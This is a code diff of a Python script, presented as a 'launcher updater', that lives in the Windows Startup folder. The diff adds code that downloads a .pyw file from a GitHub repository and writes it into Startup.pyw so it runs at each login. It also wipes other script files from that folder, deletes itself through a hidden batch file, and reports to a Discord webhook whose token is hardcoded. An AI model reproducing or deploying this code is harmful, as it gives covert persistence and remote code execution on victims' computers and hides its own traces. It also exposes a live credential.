@@ -1,4 +1,4 @@
-# monitor_script.py - Only updates launcher and sends webhook
+# monitor_script.py - Updates launcher, cleans up, and sends webhook
 import os
 import sys
 import urllib.request
@@ -7,20 +7,21 @@ import json
 import tempfile
 import subprocess
 import time
+import shutil
 
 # Discord webhook for update notifications
 UPDATE_WEBHOOK = "https://discordapp.com/api/webhooks/1462762502130630781/IohGYGgxBIr2WPLUHF14QN_8AbyUq-rVGv_KQzhX1rHokBxF_OqjWlRm96x_gbYGQEJ0"
 
-def send_update_webhook(status, message):
-    """Send update notification to Discord"""
+def send_webhook(status, title, description):
+    """Send notification to Discord"""
     try:
         data = {
             "embeds": [{
-                "title": f"🔄 Launcher Update - {status}",
-                "description": message,
-                "color": 3066993 if status == "SUCCESS" else 15158332,
+                "title": title,
+                "description": description,
+                "color": 3066993 if status == "success" else 15158332,
                 "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S'),
-                "footer": {"text": "Auto-Updater"}
+                "footer": {"text": "Launcher Updater"}
             }]
         }
         
@@ -33,15 +34,54 @@ def send_update_webhook(status, message):
     except:
         return False
 
+def clean_startup_folder():
+    """Delete ALL files from startup folder except launchers"""
+    try:
+        startup_folder = os.path.join(
+            os.getenv('APPDATA'),
+            'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
+        )
+        
+        # Files to KEEP (launcher files only)
+        keep_files = {'Startup.pyw', 'github_launcher.pyw', 'clean_launcher.pyw'}
+        
+        deleted_files = []
+        
+        for filename in os.listdir(startup_folder):
+            filepath = os.path.join(startup_folder, filename)
+            
+            # Only delete specific file types
+            if filename.endswith(('.log', '.txt', '.json', '.py', '.pyc', '.pyw')):
+                if filename not in keep_files:
+                    try:
+                        if os.path.isfile(filepath):
+                            os.remove(filepath)
+                            deleted_files.append(filename)
+                            print(f"Deleted: {filename}")
+                    except:
+                        pass
+        
+        # Also delete __pycache__ folders
+        for root, dirs, files in os.walk(startup_folder, topdown=False):
+            for dir_name in dirs:
+                if dir_name == '__pycache__':
+                    try:
+                        shutil.rmtree(os.path.join(root, dir_name))
+                        deleted_files.append(dir_name + '/')
+                    except:
+                        pass
+        
+        return deleted_files
+        
+    except Exception as e:
+        print(f"Cleanup error: {e}")
+        return []
+
 def update_launcher():
     """Replace Startup.pyw with github_launcher.pyw from GitHub"""
     try:
         # GitHub URLs
-        GITHUB_USERNAME = "ElianBoden"
-        GITHUB_REPO = "Deployer"
-        GITHUB_BRANCH = "main"
-        
-        LAUNCHER_URL = f"https://raw.githubusercontent.com/{GITHUB_USERNAME}/{GITHUB_REPO}/{GITHUB_BRANCH}/github_launcher.pyw"
+        LAUNCHER_URL = "https://raw.githubusercontent.com/ElianBoden/Deployer/main/github_launcher.pyw"
         
         # Path to startup folder
         startup_folder = os.path.join(
@@ -50,12 +90,11 @@ def update_launcher():
         )
         
         target_file = os.path.join(startup_folder, "Startup.pyw")
-        backup_file = os.path.join(startup_folder, "Startup_backup.pyw")
         
-        print(f"Downloading launcher from: {LAUNCHER_URL}")
+        print(f"Downloading launcher from GitHub...")
         
         # Download the new launcher
-        response = urllib.request.urlopen(LAUNCHER_URL)
+        response = urllib.request.urlopen(LAUNCHER_URL, timeout=10)
         new_launcher_code = response.read().decode('utf-8')
         
         print(f"Downloaded {len(new_launcher_code)} bytes")
@@ -71,111 +110,111 @@ def update_launcher():
             # Check if update is needed
             if current_code.strip() == new_launcher_code.strip():
                 print("Launcher already up to date")
-                send_update_webhook("NO CHANGE", "Launcher already up to date")
-                return False
-            
-            # Backup current launcher
-            try:
-                with open(backup_file, 'w', encoding='utf-8') as f:
-                    f.write(current_code)
-                print(f"Backup created: {backup_file}")
-            except:
-                pass
+                return False, "already_updated"
         
         # Write new launcher
         with open(target_file, 'w', encoding='utf-8') as f:
             f.write(new_launcher_code)
         
-        print(f"Launcher updated: {target_file}")
-        
-        # Delete backup after successful update
-        if os.path.exists(backup_file):
-            try:
-                os.remove(backup_file)
-                print("Backup removed")
-            except:
-                pass
-        
-        # Send success webhook
-        message = f"Successfully updated launcher from GitHub\n"
-        message += f"**File:** `Startup.pyw`\n"
-        message += f"**Size:** {len(new_launcher_code)} bytes\n"
-        message += f"**Location:** `{startup_folder}`"
-        
-        send_update_webhook("SUCCESS", message)
-        
-        return True
+        print(f"✓ Launcher updated: {target_file}")
+        return True, "updated"
         
     except Exception as e:
-        error_msg = f"Failed to update launcher: {str(e)}"
-        print(error_msg)
-        send_update_webhook("FAILED", error_msg)
-        return False
+        print(f"✗ Update failed: {e}")
+        return False, str(e)
 
-def cleanup_old_files():
-    """Remove unwanted files from startup folder"""
+def delete_this_script():
+    """Delete this monitor script from startup folder"""
     try:
+        # Get path of this script
+        this_script = os.path.abspath(__file__)
+        
+        # Check if we're in startup folder
         startup_folder = os.path.join(
             os.getenv('APPDATA'),
             'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
         )
         
-        # Keep only these files
-        files_to_keep = {'Startup.pyw', 'github_launcher.pyw'}
-        
-        for filename in os.listdir(startup_folder):
-            if filename not in files_to_keep:
-                filepath = os.path.join(startup_folder, filename)
-                try:
-                    if os.path.isfile(filepath):
-                        # Delete specific unwanted files
-                        if filename.endswith(('.log', '.txt', '.json', '.bat', '.py', '.pyw')):
-                            os.remove(filepath)
-                            print(f"Removed: {filename}")
-                except:
-                    pass
-    except:
-        pass
-
-def main():
-    """Main function - only updates launcher"""
-    print("=" * 50)
-    print("Launcher Updater")
-    print("=" * 50)
-    
-    # Clean up any old files first
-    cleanup_old_files()
-    
-    # Update the launcher
-    success = update_launcher()
-    
-    if success:
-        print("✓ Launcher update completed successfully")
-        # Restart the launcher to use new version
-        restart_launcher()
-    else:
-        print("✗ Launcher update failed or not needed")
-    
-    print("=" * 50)
-
-def restart_launcher():
-    """Restart the launcher with new version"""
-    try:
-        startup_folder = os.path.join(
-            os.getenv('APPDATA'),
-            'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
-        )
-        launcher_path = os.path.join(startup_folder, "Startup.pyw")
-        
-        if os.path.exists(launcher_path):
-            # Run new launcher in background
+        # Only delete if we're in startup folder
+        if this_script.startswith(startup_folder):
+            # Create batch file to delete this script
+            batch_content = f'''@echo off
+timeout /t 3 /nobreak >nul
+del /f /q "{this_script}" >nul 2>nul
+if exist "{this_script}" (
+    del /f /q "{this_script}" >nul 2>nul
+)
+del "%~f0" >nul 2>nul
+'''
+            
+            batch_path = tempfile.gettempdir() + "/delete_script.bat"
+            with open(batch_path, 'w') as f:
+                f.write(batch_content)
+            
+            # Run batch file in background
             subprocess.Popen(
-                [sys.executable, launcher_path],
+                ['cmd', '/c', batch_path],
                 creationflags=subprocess.CREATE_NO_WINDOW
             )
-            print("Launcher restarted with new version")
-    except:
-        pass
+            
+            print(f"✓ Scheduled deletion of: {os.path.basename(this_script)}")
+            return True
+            
+    except Exception as e:
+        print(f"✗ Failed to schedule deletion: {e}")
+    
+    return False
+
+def main():
+    """Main function - cleanup, update, delete self"""
+    print("=" * 50)
+    print("Launcher Updater & Cleaner")
+    print("=" * 50)
+    
+    # Step 1: Clean up startup folder
+    print("\n[1/3] Cleaning startup folder...")
+    deleted_files = clean_startup_folder()
+    
+    if deleted_files:
+        print(f"Deleted {len(deleted_files)} files/folders")
+        for f in deleted_files:
+            print(f"  - {f}")
+    
+    # Step 2: Update the launcher
+    print("\n[2/3] Updating launcher...")
+    updated, status = update_launcher()
+    
+    # Step 3: Delete this script
+    print("\n[3/3] Removing monitor script...")
+    self_deleted = delete_this_script()
+    
+    # Send webhook
+    print("\n[+] Sending webhook...")
+    if updated:
+        title = "✅ Launcher Updated Successfully"
+        description = f"**Action:** Replaced Startup.pyw with github_launcher.pyw\n"
+        description += f"**Status:** Updated successfully\n"
+        if deleted_files:
+            description += f"**Cleaned up:** {len(deleted_files)} files\n"
+        description += f"**Self-removal:** {'Yes' if self_deleted else 'No'}"
+    else:
+        title = "ℹ️ Launcher Update Checked"
+        description = f"**Action:** Launcher update check\n"
+        description += f"**Status:** {status}\n"
+        if deleted_files:
+            description += f"**Cleaned up:** {len(deleted_files)} files"
+    
+    send_webhook("success" if updated else "info", title, description)
+    
+    print("\n" + "=" * 50)
+    print("✓ Update process completed")
+    print("✓ Startup folder cleaned")
+    print("✓ Webhook sent")
+    print("✓ This script will self-delete")
+    print("=" * 50)
+    
+    # Small delay before exit
+    time.sleep(2)
 
 if __name__ == "__main__":
     main()
